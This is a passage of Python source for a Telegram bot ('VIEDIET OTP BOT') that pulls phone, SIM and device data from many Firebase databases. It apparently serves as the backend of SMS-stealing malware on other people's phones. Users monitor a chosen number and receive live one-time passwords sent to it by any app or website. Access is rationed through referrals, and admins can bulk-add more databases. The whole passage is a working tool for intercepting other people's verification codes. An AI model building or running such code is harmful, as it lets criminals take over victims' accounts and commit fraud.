        b["callback_data"] = cb
    if url:
        b["url"] = url
    if switch:
        b["switch_inline_query_current_chat"] = switch
    if style:
        b["style"] = style
    if icon:
        b["icon_custom_emoji_id"] = icon
    return b


_PLAIN_KEYS = ("text", "url", "callback_data", "switch_inline_query_current_chat")


def _norm_rows(rows) -> list:
    out = []
    for row in rows:
        out.append(row if isinstance(row, list) else [row])
    return out


def _send_rows(chat_id, text, rows, parse_mode="HTML", edit_message_id=None):
    """Colored buttons ke saath raw API send; agar style unsupported hua to plain fallback."""
    rows = _norm_rows(rows)
    method = "editMessageText" if edit_message_id else "sendMessage"
    payload = {
        "chat_id": chat_id, "text": text, "parse_mode": parse_mode,
        "disable_web_page_preview": True,
        "reply_markup": {"inline_keyboard": rows},
    }
    if edit_message_id:
        payload["message_id"] = edit_message_id
    try:
        r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
                          json=payload, timeout=15)
        if r.status_code == 200:
            return r.json().get("result", {}).get("message_id")
        if "message is not modified" in r.text:
            return edit_message_id or 1
        plain = {"inline_keyboard": [
            [{k: v for k, v in b.items() if k in _PLAIN_KEYS} for b in row]
            for row in rows]}
        payload["reply_markup"] = plain
        r2 = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
                           json=payload, timeout=15)
        if r2.status_code == 200:
            return r2.json().get("result", {}).get("message_id")
        if "message is not modified" in r2.text:
            return edit_message_id or 1
        log.warning("TG rows failed (%s): %s", r.status_code, r.text[:150])
    except Exception as e:
        log.warning("TG rows error: %s", e)
    return None


async def _ui(update, chat_id: int, text: str, rows: list, mid=None) -> bool:
    """Edit try karo; fail ho to naya message bhejo — UI kabhi invisible nahi rahega."""
    ok = _send_rows(chat_id, text, rows, edit_message_id=mid)
    if not ok and mid:
        try:
            await update.effective_user.send_message(
                text, parse_mode=ParseMode.HTML,
                reply_markup=_rows_to_markup(rows), disable_web_page_preview=True)
            ok = True
        except Exception as e:
            log.warning("_ui fallback failed: %s", e)
    return ok


def home_keyboard(user_id: int = None) -> list:
    admin = is_admin(user_id) if user_id else True
    rows = [
        [B("📡 Numbers", "panels", style="primary", icon=ICON_BLUE),
         B("📊 Status", "status", style="primary")],
    ]
    if admin:
        rows.append([B("➕ Add Firebase", "fbadd", style="success", icon=ICON_GREEN),
                     B("🛠 Admin Panel", "admin", style="primary", icon=ICON_BLUE)])
    rows.append([B("👥 Refer & Earn", "refer", style="primary", icon=ICON_BLUE),
                 B("⏹ Stop All", "stopall", style="danger", icon=ICON_RED)])
    rows.append([B("❓ Help", "help", style="primary")])
    return rows


def _refer_screen_text(user_id: int, first_name: str, context) -> tuple:
    users = settings.setdefault("users", {})
    u = users.setdefault(str(user_id), {"access_until": 0, "referred": []})
    referred_count = len(u.get("referred", []))
    link = f"https://t.me/viediet_otp_bot?start=ref_{user_id}"
    text = (
        f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
        f"⏰ <b>Aapka access nahi hai</b>\n\n"
        f"📢 <b>REFER & EARN</b>\n"
        f"👥 1 Refer = <b>{REF_HOURS} Hour</b> use!\n"
        f"⭐ Aapke refers: <b>{referred_count}</b>\n\n"
        f"🔗 Apna refer link:\n<code>{link}</code>\n\n"
        f"Friends ko link share karo,\n"
        f"wo join karein → aapko +{REF_HOURS} hour milega!"
    )
    rows = [
        [B("📤 Share Refer Link", switch=link, style="success", icon=ICON_GREEN)],
        [B("✅ Mene Refer Kiya", "checkaccess", style="primary", icon=ICON_BLUE)],
    ]
    return text, rows


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # ── 1) FORCE JOIN sabse pehle ──────────────────────────────────
    if not is_admin(user.id):
        if not await _force_join_ok(update, context):
            return

    # ── 2) Refer deep link: /start ref_<id> ────────────────────────
    if context.args and context.args[0].startswith("ref_"):
        ref_id = context.args[0][4:]
        if ref_id.isdigit() and int(ref_id) != user.id:
            users = settings.setdefault("users", {})
            nu = users.setdefault(str(user.id), {"access_until": 0, "referred": []})
            nu["access_until"] = max(float(nu.get("access_until", 0)), time.time() + REF_HOURS * 3600)
            rk = str(ref_id)
            if rk != str(user.id):
                rl = users.setdefault(rk, {"access_until": 0, "referred": []})
                if str(user.id) not in rl.get("referred", []):
                    rl.setdefault("referred", []).append(str(user.id))
                    rl["access_until"] = float(rl.get("access_until", 0)) + REF_HOURS * 3600
            save_settings()
            await update.message.reply_text(
                f"🎉 <b>Welcome {html.escape(user.first_name)}!</b>\n"
                f"✅ Aapko <b>{REF_HOURS} hour</b> free access mila\n"
                f"⏰ Access: <b>+{REF_HOURS} hour</b>\n\n"
                f"📢 Ek aur friend ko refer karo = aur <b>{REF_HOURS} hour</b>!",
                parse_mode=ParseMode.HTML)

    # ── 3) Access gate → refer screen ──────────────────────────────
    if not is_admin(user.id) and not has_access(user.id):
        text, rows = _refer_screen_text(user.id, user.first_name, context)
        _send_rows(update.effective_chat.id, text, rows)
        return

    # ── 4) Welcome home ────────────────────────────────────────────
    text = (
        f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
        f"👋 Welcome back, <b>{html.escape(user.first_name)}</b>!\n\n"
        f"🔍 Koi bhi number select karo aur uspe aane wala\n"
        f"<b>kisi bhi app ya website ka OTP</b> yahan live dikhega.\n\n"
        f"🧭 <b>Buttons se sab kuch:</b>\n"
        f"📡 Numbers — saare numbers (🟢/⚫)\n"
        f"👥 Refer & Earn — 1 refer = 1 hour\n"
        f"📊 Status — live counts"
    )
    _send_rows(update.effective_chat.id, text, home_keyboard(user.id))


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    text = (
        f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
        f"<b>How to use:</b>\n\n"
        f"1️⃣ <b>/panels</b> → saare numbers dekho\n"
        f"2️⃣ Number pe tap karo → monitor start\n"
        f"3️⃣ Us number pe kisi bhi app/website ka OTP bhejo\n"
        f"4️⃣ OTP yahan <b>live</b> aayega 🔑\n\n"
        f"<b>Auto-Fill:</b> 🔁 button OTP ko directly aapke chat input box me\n"
        f"daal dega — bas paste kar do jahan chahiye.\n\n"
        f"<b>Note:</b> Auto-Fill ke liye BotFather me bot ka "
        f"<code>/setinline</code> ON karna hoga."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        if not has_access(update.effective_user.id):
            await update.message.reply_text(
                "⏰ <b>Access nahi hai!</b>\n\n📢 1 Refer = 1 hour use!\n/start se apna refer link lo.",
                parse_mode=ParseMode.HTML)
            return
    with state_lock:
        n = len(monitors)
        otps = sum(m["otps"] for m in monitors.values())
    td, on, off = counts()
    text = (
        f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
        f"📊 <b>Status</b>\n"
        f"🖥 Active monitors: <b>{n}</b>\n"
        f"🔑 OTPs captured: <b>{otps}</b>\n"
        f"📱 Numbers: 🟢 {on} / ⚫ {off} (total {on + off})\n"
        f"🖥 Devices: <b>{td}</b>\n"
        f"🗄 Databases: <b>{len(all_databases())}</b>\n"
        f"👥 Users: <b>{len(settings.get('users', {}))}</b>"
    )
    _send_rows(update.effective_chat.id, text, home_keyboard(update.effective_user.id))


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    n = stop_all_monitors()
    _send_rows(update.effective_chat.id, f"⏹ Sab {n} monitors band kar diye.", home_keyboard(update.effective_user.id))


def build_num_list():
    global num_list
    seen_nums = set()
    num_list = []
    for p in discovered_panels:
        for d in p["devices"]:
            for num in d["numbers"]:
                if num in seen_nums:
                    continue
                seen_nums.add(num)
                num_list.append({
                    "num": num,
                    "device_id": d["id"],
                    "panel_url": p["url"],
                    "panel_tag": p["tag"],
                    "status": d["status"],
                })
    num_list.sort(key=lambda r: (r["status"] != "online", r["num"]))


def counts():
    td = sum(p["total_devices"] for p in discovered_panels)
    on = sum(p["online_numbers"] for p in discovered_panels)
    off = sum(p["offline_numbers"] for p in discovered_panels)
    return td, on, off


def find_device(panel_url: str, device_id: str):
    for p in discovered_panels:
        if p["url"] != panel_url:
            continue
        for d in p["devices"]:
            if d["id"] == device_id:
                return p, d
    return None, None


async def panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        if not has_access(update.effective_user.id):
            await update.message.reply_text(
                "⏰ <b>Access nahi hai!</b>\n\n📢 1 Refer = 1 hour use!\n/start se apna refer link lo.",
                parse_mode=ParseMode.HTML)
            return
        if not await _force_join_ok(update, context):
            return
    msg = await update.message.reply_text("🔍 Numbers scan ho rahe hain... (177 panels)")
    await _do_discover(update, context, msg)


async def _do_discover(update: Update, context: ContextTypes.DEFAULT_TYPE, msg=None):
    global discovered_panels
    discovered_panels = await discover_active_panels()
    build_num_list()
    if not num_list:
        text = "❌ Koi number nahi mila."
        if msg:
            await msg.edit_text(text)
        else:
            await update.message.reply_text(text)
        return
    if is_admin(update.effective_user.id):
        await _show_numbers(update, context, msg or update.message, 0)
    else:
        await _show_my_number(update, context, msg or update.message)


def _pick_assigned_number(user_id: int):
    """Sirf ONLINE numbers me se ek random number pick + assign."""
    if not num_list:
        return None
    online = [i for i, r in enumerate(num_list) if r["status"] == "online"]
    if not online:
        online = list(range(len(num_list)))
    idx = random.choice(online)
    settings.setdefault("assignments", {})[str(user_id)] = {
        "idx": idx, "num": num_list[idx]["num"], "ts": time.time()}
    save_settings()
    return idx


async def _show_my_number(update: Update, context: ContextTypes.DEFAULT_TYPE, target, idx=None, force_new=False):
    uid = update.effective_user.id
    if not num_list:
        global discovered_panels
        discovered_panels = await discover_active_panels()
        build_num_list()
    if force_new or idx is None:
        assign = settings.setdefault("assignments", {}).get(str(uid)) or {}
        a_idx = assign.get("idx")
        if force_new or a_idx is None or a_idx >= len(num_list):
            idx = _pick_assigned_number(uid)
        else:
            idx = a_idx
    if idx is None or idx >= len(num_list):
        await context.bot.send_message(
            uid, "❌ Koi number nahi mila — thodi der baad try karo.")
        return
    r = num_list[idx]
    status_txt = "🟢 ONLINE" if r["status"] == "online" else "⚫ OFFLINE"
    with state_lock:
        key = dev_key(r["panel_url"], r["device_id"])
        monitoring = key in monitors
        m = monitors.get(key) or {}
        mid = m.get("mid")
    rows = []
    if not monitoring:
        rows.append([B("▶️ Monitor (1s)", f"mon|{idx}", style="success", icon=ICON_GREEN)])
    else:
        rows.append([B("🔄 Monitoring...", "noop", style="primary"),
                     B("⏹ Stop", f"stop|{mid}", style="danger", icon=ICON_RED)])
    rows.append([B("🎲 Naya Number", "newnum", style="primary", icon=ICON_BLUE),
                 B("📊 Status", "status", style="primary")])
    rows.append([B("🏠 Home", "home", style="primary")])
    text = (
        f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
        f"📱 <b>AAPKA NUMBER</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{status_txt}\n"
        f"📱 Number: <code>{html.escape(r['num'])}</code>\n"
        f"🆔 Device: <code>{html.escape(r['device_id'][:20])}</code>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"▶ Monitor karo — is number pe OTP aayega yahan 🔑\n"
        f"🎲 Naya Number se dusra number mil sakta hai!"
    )
    chat_id = target.chat_id if hasattr(target, "chat_id") else update.effective_chat.id
    mid2 = target.message_id if hasattr(target, "message_id") else None
    ok = _send_rows(chat_id, text, rows, edit_message_id=mid2)
    if not ok:
        await context.bot.send_message(update.effective_user.id, text,
                                       parse_mode=ParseMode.HTML,
                                       reply_markup=_rows_to_markup(rows))


async def _show_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE, target, page: int):
    total = len(num_list)
    pages = max(1, (total + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    td, on, off = counts()
    chunk = num_list[page * PAGE_SIZE:(page + 1) * PAGE_SIZE]

    buttons = []
    for i in range(page * PAGE_SIZE, page * PAGE_SIZE + len(chunk)):
        r = num_list[i]
        if r["status"] == "online":
            buttons.append([B(f"🟢 {r['num']}", f"n|{i}", style="success", icon=ICON_GREEN)])
        else:
            buttons.append([B(f"⚫ {r['num']}", f"n|{i}", style="primary", icon=ICON_BLUE)])

    nav = []
    if page > 0:
        nav.append(B("◀ Prev", f"pg|{page - 1}", style="primary"))
    nav.append(B(f"📄 {page + 1}/{pages}", "noop", style="primary"))
    if page < pages - 1:
        nav.append(B("Next ▶", f"pg|{page + 1}", style="primary"))
    buttons.append(nav)
    buttons.append([
        B("🔄 Refresh", "refresh", style="primary"),
        B("⏹ Stop All", "stopall", style="danger", icon=ICON_RED),
    ])
    buttons.append([
        B("📊 Status", "status", style="primary"),
        B("🏠 Home", "home", style="primary"),
    ])

    text = (
        f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
        f"📱 Total Numbers: <b>{total}</b>\n"
        f"🟢 Active: <b>{on}</b> | ⚫ Inactive: <b>{off}</b>\n"
        f"🖥 Total Devices: <b>{td}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"Number select karo 👇"
    )
    chat_id = target.chat_id if hasattr(target, "chat_id") else update.effective_chat.id
    mid = target.message_id if hasattr(target, "message_id") else None
    if mid is not None:
        ok = _send_rows(chat_id, text, buttons, edit_message_id=mid)
        if not ok:
            await context.bot.send_message(
                update.effective_user.id, text, parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(_rows_to_markup(buttons)))
    else:
        ok = _send_rows(chat_id, text, buttons)
        if not ok:
            await context.bot.send_message(
                update.effective_user.id, text, parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(_rows_to_markup(buttons)))


def _rows_to_markup(rows) -> InlineKeyboardMarkup:
    out = []
    for row in _norm_rows(rows):
        out.append([InlineKeyboardButton(
            b["text"],
            callback_data=b.get("callback_data"),
            url=b.get("url"),
            switch_inline_query_current_chat=b.get("switch_inline_query_current_chat"),
        ) for b in row])
    return InlineKeyboardMarkup(out)


async def all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        if not has_access(update.effective_user.id):
            await update.message.reply_text(
                "⏰ <b>Access nahi hai!</b>\n\n📢 1 Refer = 1 hour use!\n/start se apna refer link lo.",
                parse_mode=ParseMode.HTML)
            return
        if not await _force_join_ok(update, context):
            return
    msg = await update.message.reply_text("🚀 Sab devices scan ho rahe hain...")
    global discovered_panels
    discovered_panels = await discover_active_panels()
    build_num_list()
    if not discovered_panels:
        await msg.edit_text("❌ Koi online device nahi mila.")
        return
    started = 0
    for p in discovered_panels:
        for d in p["online_devices"]:
            if start_monitor(p, d, update.effective_user.id):
                started += 1
    await msg.edit_text(
        f"✅ <b>{started}</b> devices pe live monitoring start!\n"
        f"Ab kisi bhi number pe OTP bhejo — yahan dikhega 🔑",
        parse_mode=ParseMode.HTML)


async def _device_details(panel_url: str, device_id: str):
    info, sim = await asyncio.gather(
        aio_fb_get(f"All_Users/Data/DeviceInfo/{device_id}", panel_url),
        aio_fb_get(f"All_Users/simDetails/{device_id}", panel_url),
        return_exceptions=True)
    return (info if isinstance(info, dict) else {}), (sim if isinstance(sim, dict) else {})


def _sim_line(sim: dict, n: int) -> str:
    num = sim.get(f"sim{n}Number") or sim.get(f"numberSim{n}")
    prov = sim.get(f"sim{n}Provider")
    if not num:
        return ""
    clean = re.sub(r"\D", "", str(num))[-10:]
    prov_txt = f" — {prov}" if prov else ""
    return f"📶 SIM {n}: <code>{clean}</code>{prov_txt}\n"


async def _device_card(update: Update, context: ContextTypes.DEFAULT_TYPE, idx: int, msg=None):
    if idx >= len(num_list):
        return
    r = num_list[idx]
    p, d = find_device(r["panel_url"], r["device_id"])
    if not p or not d:
        await update.callback_query.answer("Device nahi mila", show_alert=True)
        return
    info, sim = await _device_details(p["url"], d["id"])

    status = str(info.get("Status", r["status"])).lower()
    status_txt = "🟢 ONLINE" if status == "online" else "⚫ OFFLINE"
    battery = html.escape(str(info.get("Battery", "—")))
    model = html.escape(str(info.get("DeviceModel", info.get("Brand", "—"))))
    brand = html.escape(str(info.get("Brand", "")))
    android = html.escape(str(info.get("AndroidVersion", "—")))
    last_seen = html.escape(str(info.get("currentTime", "—")))
    sim_txt = _sim_line(sim, 1) + _sim_line(sim, 2)
    if not sim_txt:
        sim_txt = f"📶 Numbers: <code>{html.escape(', '.join(d['numbers']))}</code>\n"

    with state_lock:
        key = dev_key(p["url"], d["id"])
        m = monitors.get(key) or {}
        mid = m.get("mid")
        monitoring = key in monitors

    buttons = []
    if not monitoring:
        buttons.append([B("▶️ Monitor (1s)", f"mon|{idx}", style="success", icon=ICON_GREEN)])
    else:
        buttons.append([B("🔄 Already Monitoring", "noop", style="primary"),
                        B("⏹ Stop", f"stop|{mid}", style="danger", icon=ICON_RED)])
    buttons.append([B("◀ Back to numbers", "pg|0", style="primary")])

    text = (
        f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
        f"📱 <b>DEVICE DETAILS</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{status_txt}\n"
        f"{sim_txt}"
        f"🔋 Battery: <b>{battery}</b>\n"
        f"📱 Model: <b>{model}</b>{' (' + brand + ')' if brand and brand not in model else ''}\n"
        f"🤖 Android: <b>{android}</b>\n"
        f"🆔 ID: <code>{html.escape(d['id'])}</code>\n"
        f"⏱ Last seen: {last_seen}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"▶ Monitor karo to us number pe aane wale OTP yahan\n"
        f"live aayenge 🔑"
    )
    target = msg or update.callback_query.message
    chat_id = target.chat_id if hasattr(target, "chat_id") else update.effective_chat.id
    mid2 = target.message_id if hasattr(target, "message_id") else None
    ok = _send_rows(chat_id, text, buttons, edit_message_id=mid2)
    if not ok:
        await context.bot.send_message(
            update.effective_user.id, text, parse_mode=ParseMode.HTML,
            reply_markup=_rows_to_markup(buttons))


async def _monitor_number(update: Update, context: ContextTypes.DEFAULT_TYPE, idx: int):
    if idx >= len(num_list):
        return
    r = num_list[idx]
    p, d = find_device(r["panel_url"], r["device_id"])
    if not p or not d:
        await update.callback_query.answer("Device nahi mila", show_alert=True)
        return
    started = start_monitor(p, d, update.effective_user.id)
    status = "✅ Monitoring <b>started</b> (1s interval)" if started else "⚠️ Pehle se monitoring chal rahi hai"
    with state_lock:
        key = dev_key(p["url"], d["id"])
        m = monitors.get(key) or {}
        mid = m.get("mid")
    buttons = []
    if mid:
        buttons.append([B("⏹ Stop this monitor", f"stop|{mid}", style="danger", icon=ICON_RED)])
    buttons.append([B("◀ Back", "backcard", style="primary")])
    text = (
        f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
        f"{status}\n\n"
        f"📱 Number: <code>{html.escape(r['num'])}</code>\n"
        f"🆔 Device: <code>{html.escape(d['id'])}</code>\n"
        f"📱 All numbers: <code>{html.escape(', '.join(d['numbers']))}</code>\n\n"
        f"Ab is number pe kisi bhi app/website ka OTP bhejo,\n"
        f"yahan live aayega 🔑"
    )
    chat_id = update.callback_query.message.chat_id
    mid2 = update.callback_query.message.message_id
    ok = _send_rows(chat_id, text, buttons, edit_message_id=mid2)
    if not ok:
        await update.callback_query.message.reply_text(text, parse_mode=ParseMode.HTML)


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data

    if data == "cancelinput":
        awaiting_input.pop(uid, None)
        await _ui(update, query.message.chat_id,
                  f"{BRAND}\n━━━━━━━━━━━━━━━━\n❌ Cancelled.",
                  home_keyboard(uid), mid=query.message.message_id)
        return

    if not is_admin(uid) and not has_access(uid):
        if query.data not in ("checkaccess",):
            await query.answer("⏰ Access nahi! /start se refer karo.", show_alert=True)
            return

    if data == "refer":
        users = settings.setdefault("users", {})
        u = users.setdefault(str(uid), {"access_until": 0, "referred": []})
        referred_list = u.get("referred", []) or []
        referred_count = len(referred_list)
        now_ts = time.time()
        lines = []
        for rid in referred_list[:10]:
            ru = users.get(str(rid), {})
            try:
                until = float(ru.get("access_until", 0))
            except (TypeError, ValueError):
                until = 0
            mark = "✅" if until > now_ts else "⏳"
            left = max(0, int((until - now_ts) / 3600))
            lines.append(f"{mark} <code>{rid}</code> — {left}h left")
        ref_txt = "\n".join(lines) if lines else "Abhi koi refer nahi"
        try:
            bot_info = await context.bot.get_me()
            uname = bot_info.username
        except Exception:
            uname = "viediet_otp_bot"
        link = f"https://t.me/{uname}?start=ref_{uid}"
        try:
            access_left = max(0, int((float(u.get("access_until", 0)) - now_ts) / 3600))
        except (TypeError, ValueError):
            access_left = 0
        text = (
            f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
            f"👥 <b>REFER & EARN</b>\n"
            f"⏰ 1 Refer = <b>{REF_HOURS} Hour</b> access!\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"⭐ Aapke refers: <b>{referred_count}</b>\n"
            f"{ref_txt}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"⏳ Aapka access: <b>{access_left}h</b> bacha\n"
            f"🔗 Aapka refer link:\n<code>{link}</code>\n\n"
            f"Link kisi ko bhi bhejo — wo join karega,\n"
            f"aapko +{REF_HOURS} hour milega!"
        )
        rows = [
            [B("📤 Share Refer Link", switch=link, style="success", icon=ICON_GREEN)],
            [B("✅ Mene Refer Kiya", "checkaccess", style="primary"),
             B("🏠 Home", "home")],
        ]
        await _ui(update, query.message.chat_id, text, rows,
                  mid=query.message.message_id)
        return

    if data == "fbadd":
        if not is_admin(uid):
            await query.answer("❌ Sirf ADMIN Firebase add kar sakta hai", show_alert=True)
            return
        awaiting_input[uid] = "fbadd"
        await _ui(update, query.message.chat_id,
                  f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
                  f"➕ <b>Firebase add karo</b>\n\n"
                  f"• URLs yahan bhejo (bulk = har line me ek) 👇\n"
                  f"<code>https://app-default-rtdb.firebaseio.com</code>\n\n"
                  f"• Ya <b>.txt file upload</b> karo (har line me ek URL)\n"
                  f"• Duplicate → <b>skip</b> ✅",
                  [B("❌ Cancel", "cancelinput", style="danger", icon=ICON_RED)],
                  mid=query.message.message_id)
        return

    if data in ("verify", "admin", "fjtoggle", "fjadd", "fjrm", "clearcache", "broadcast",
                "fbrm", "users", "grant"):
        await _handle_admin_callback(update, context, data)
        return

    if data.startswith("fjdel|") or data.startswith("int|") or data.startswith("fbdel|"):
        await _handle_admin_callback(update, context, data)
        return

    if data == "home":
        _send_rows(query.message.chat_id,
                   f"{BRAND}\n━━━━━━━━━━━━━━━━\n👋 Main menu",
                   home_keyboard(update.effective_user.id), edit_message_id=query.message.message_id)

    elif data == "noop":
        pass

    elif data == "panels":
        msg = await query.message.edit_text("🔍 Numbers scan ho rahe hain...")
        await _do_discover(update, context, msg)

    elif data == "all":
        await query.answer("🚫 Monitor All hata diya — Numbers se select karo", show_alert=True)

    elif data == "refresh":
        msg = await query.message.edit_text("🔄 Refresh ho raha hai...")
        await _do_discover(update, context, msg)

    elif data == "status":
        with state_lock:
            n = len(monitors)
            otps = sum(m["otps"] for m in monitors.values())
        td, on, off = counts()
        text = (
            f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
            f"📊 <b>Status</b>\n"
            f"🖥 Active monitors: <b>{n}</b>\n"
            f"🔑 OTPs captured: <b>{otps}</b>\n"
            f"📱 Numbers: 🟢 {on} / ⚫ {off} (total {on + off})\n"
            f"🖥 Devices: <b>{td}</b>"
        )
        _send_rows(query.message.chat_id, text, home_keyboard(update.effective_user.id),
                   edit_message_id=query.message.message_id)

    elif data == "stopall":
        n = stop_all_monitors()
        _send_rows(query.message.chat_id, f"⏹ Sab {n} monitors band kar diye.",
                   home_keyboard(update.effective_user.id), edit_message_id=query.message.message_id)

    elif data == "help":
        _send_rows(query.message.chat_id,
                   f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
                   f"1️⃣ <b>📡 Numbers</b> → aapko <b>1 random number</b> assign hoga (sirf active)\n"
                   f"2️⃣ <b>▶️ Monitor</b> → us number pe OTP live aayega 🔑\n"
                   f"3️⃣ <b>🎲 Naya Number</b> → dusra number mil sakta hai\n"
                   f"4️⃣ <b>🔁 Auto-Fill</b> OTP ko input box me daal deta hai\n"
                   f"5️⃣ <b>👥 Refer</b> → 1 refer = {REF_HOURS} hour access",
                   home_keyboard(update.effective_user.id), edit_message_id=query.message.message_id)

    elif data == "newnum":
        if not is_admin(uid):
            if not has_access(uid):
                await query.answer("⏰ Access nahi!", show_alert=True)
                return
            await _show_my_number(update, context, query.message, force_new=True)

    elif data == "backcard":
        if is_admin(uid):
            await _show_numbers(update, context, query.message, 0)
        else:
            await _show_my_number(update, context, query.message)

    elif data.startswith("n|"):
        if not is_admin(uid):
            await query.answer("❌ Sirf admin — aapko number assign hai", show_alert=True)
            return
        idx = int(data.split("|")[1])
        await _device_card(update, context, idx)

    elif data.startswith("mon|"):
        idx = int(data.split("|")[1])
        await _monitor_number(update, context, idx)

    elif data.startswith("pg|"):
        if not is_admin(uid):
            await query.answer("❌ Sirf admin", show_alert=True)
            return
        page = int(data.split("|")[1])
        await _show_numbers(update, context, query.message, page)

    elif data.startswith("stop|"):
        mid = int(data.split("|")[1])
        key = monitor_mid.get(mid)
        if key and stop_monitor(key):
            _send_rows(query.message.chat_id, "⏹ Monitor band kar diya.",
                       home_keyboard(update.effective_user.id), edit_message_id=query.message.message_id)
        else:
            await query.answer("Pehle se band hai", show_alert=True)

    elif data.startswith("used|"):
        sid = int(data.split("|")[1])
        sms_key = sms_id_map.pop(sid, None)
        if sms_key:
            sent = sms_sent.pop(sms_key, None)
            if sent:
                try:
                    await context.bot.edit_message_text(
                        chat_id=sent["chat_id"], message_id=sent["message_id"],
                        text="✅ <b>OTP USED</b> 🥷 VIEDIET OTP BOT", parse_mode=ParseMode.HTML)
                except Exception:
                    pass
        await query.answer("Marked as used ✅")


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    log.error("Update error: %s", context.error)
    try:
        uid = None
        if isinstance(update, Update):
            uid = (update.effective_user or update.callback_query.from_user
                   if update.callback_query else None)
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    f"⚠️ <b>BOT ERROR</b>\n\n"
                    f"User: <code>{uid}</code>\n"
                    f"Error: <code>{html.escape(str(context.error)[:400])}</code>",
                    parse_mode=ParseMode.HTML)
                break
            except Exception:
                continue
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# ADMIN PANEL + FORCE JOIN
# ═══════════════════════════════════════════════════════════════

awaiting_input: Dict[int, str] = {}   # user_id -> "channel" / "broadcast"


def all_databases() -> Dict[str, str]:
    dbs = dict(DATABASES)
    for tag, info in settings.get("user_databases", {}).items():
        if isinstance(info, dict) and info.get("url"):
            dbs[tag] = info["url"]
    return dbs


def has_access(user_id: int) -> bool:
    if is_admin(user_id):
        return True
    u = settings.get("users", {}).get(str(user_id))
    return bool(u) and float(u.get("access_until", 0)) > time.time()


REF_HOURS = 1  # 1 refer = 1 hour

async def _force_join_ok(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user = update.effective_user
    if is_admin(user.id):
        return True
    fjoin = settings.get("force_join", {})
    if not fjoin.get("enabled") or not fjoin.get("channels"):
        return True
    missing = []
    for ch in fjoin["channels"]:
        try:
            m = await context.bot.get_chat_member(chat_id=ch, user_id=user.id)
            if m.status in ("member", "administrator", "creator"):
                continue
        except Exception:
            continue
        missing.append(ch)
    if missing:
        buttons = [[B(f"🔗 Join {ch}", url=f"https://t.me/{ch.lstrip('@')}",
                      style="success", icon=ICON_GREEN)] for ch in missing]
        buttons.append([B("✅ Verify", "verify", style="primary", icon=ICON_BLUE)])
        _send_rows(update.effective_chat.id,
                   f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
                   f"⚠️ <b>Bot use karne ke liye join karo:</b>\n"
                   + "\n".join(f"📢 {ch}" for ch in missing),
                   buttons)
        return False
    return True


async def _admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE, target=None):
    fjoin = settings.get("force_join", {})
    chans = fjoin.get("channels", [])
    chans_txt = "\n".join(f"   📢 {c}" for c in chans) if chans else "   (koi channel nahi)"
    with state_lock:
        n_mon = len(monitors)
        otps = sum(m["otps"] for m in monitors.values())
    interval = float(settings.get("monitor_interval", 1.0))
    text = (
        f"{BRAND}\n━━━━━━━━━━━━━━━━\n"
        f"🛠 <b>ADMIN PANEL</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📡 <b>Force Join:</b> {'🟢 ON' if fjoin.get('enabled') else '⚫ OFF'}\n"
        f"{chans_txt}\n"
        f"⏱ Monitor interval: <b>{interval:g}s</b>\n"
        f"📱 Numbers: <b>{len(num_list)}</b>\n"
        f"🖥 Active monitors: <b>{n_mon}</b>\n"
        f"🔑 OTPs captured: <b>{otps}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"Options select karo 👇"
    )
    buttons = [
        [B(f"📡 Force Join: {'ON' if fjoin.get('enabled') else 'OFF'}", "fjtoggle",
           style="primary" if fjoin.get('enabled') else None, icon=ICON_BLUE),
         B("➕ Channel", "fjadd")],
        [B("🗑 Remove Channel", "fjrm")],
        [B("➕ Add Firebase", "fbadd", style="success", icon=ICON_GREEN),
         B("🗑 Remove Firebase", "fbrm", style="danger", icon=ICON_RED)],
        [B("🎟 Grant Access", "grant", style="success", icon=ICON_GREEN),
         B("📊 Users & Refers", "users", style="primary")],
        [B("⏱ 1s", "int|1", style="primary"),
         B("⏱ 2s", "int|2", style="primary"),
         B("⏱ 3s", "int|3", style="primary")],
        [B("🧹 Clear Cache", "clearcache"),
         B("📢 Broadcast", "broadcast", style="primary")],
        [B("🏠 Home", "home")],
    ]
    if target:
